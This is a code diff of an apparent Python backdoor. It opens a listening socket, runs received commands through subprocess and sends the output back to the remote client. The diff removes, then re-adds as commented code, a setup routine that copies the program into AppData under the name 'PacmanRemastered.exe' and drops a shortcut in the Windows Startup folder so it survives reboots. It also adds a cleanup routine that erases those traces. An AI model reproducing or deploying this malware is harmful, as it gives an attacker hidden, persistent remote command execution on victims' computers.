@@ -3,9 +3,6 @@ import sys
 import socket
 import time
 import subprocess
-import shutil
-import win32com.client
-# uncomment firstSetup()
 
 privateKey: str = "?!(asLK03,,yB/["
 sys.stderr = sys.stdout
@@ -20,24 +17,6 @@ except:
 sock.listen(5)
 print("Socket Created and Listening . . . ")
 
-def firstSetup():
-    shell = win32com.client.Dispatch("WScript.Shell")
-    targetPath: str = "C:/Users/"+os.getlogin()+"/AppData/Roaming/Patcher"
-    startupPath: str = "C:/Users/"+os.getlogin()+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
-    try:
-        if (not os.path.isdir(targetPath)):
-            os.mkdir(targetPath)
-        if (not os.path.isdir(targetPath + "/dist")):
-            head, tail = os.path.split(sys.argv[0])
-            shutil.copytree(head, (targetPath + "/dist"))
-            shortcut = shell.CreateShortCut(targetPath + "/dist/PacmanRemastered.lnk")
-            shortcut.Targetpath = targetPath + "/dist/PacmanRemastered.exe"
-            shortcut.save()
-            shutil.copy(targetPath + "/dist/PacmanRemastered.lnk", startupPath)
-    except:
-        print("Setup Unsuccessful")
-        pass
-    
 def clientConnect():
     global finished
     finished = False
@@ -117,5 +96,33 @@ def runCommand(command: str, client: socket.socket):
                     break
                 client.send(line.strip())
 
-# firstSetup()
 clientConnect()
+
+
+
+# def firstSetup():
+#     shell = win32com.client.Dispatch("WScript.Shell")
+#     targetPath: str = "C:/Users/"+os.getlogin()+"/AppData/Roaming/Patcher"
+#     startupPath: str = "C:/Users/"+os.getlogin()+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+#     try:
+#         if (not os.path.isdir(targetPath)):
+#             os.mkdir(targetPath)
+#         if (not os.path.isdir(targetPath + "/dist")):
+#             head, tail = os.path.split(sys.argv[0])
+#             shutil.copytree(head, (targetPath + "/dist"))
+#             shortcut = shell.CreateShortCut(targetPath + "/dist/Server.lnk")
+#             shortcut.Targetpath = targetPath + "/dist/Server.exe"
+#             shortcut.save()
+#             shutil.copy(targetPath + "/dist/Server.lnk", startupPath)
+#     except:
+#         print("Setup Unsuccessful")
+#         pass
+
+# def lastSetdown():
+#     targetPath: str = "C:/Users/"+os.getlogin()+"/AppData/Roaming/Patcher/dist"
+#     startupPath: str = "C:/Users/"+os.getlogin()+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Server.lnk"
+#     try:
+#         subprocess.Popen("cmd.exe /c del " + startupPath)
+#         subprocess.Popen("cmd.exe /c rd " + targetPath + " /s /q")
+#     except:
+#         pass
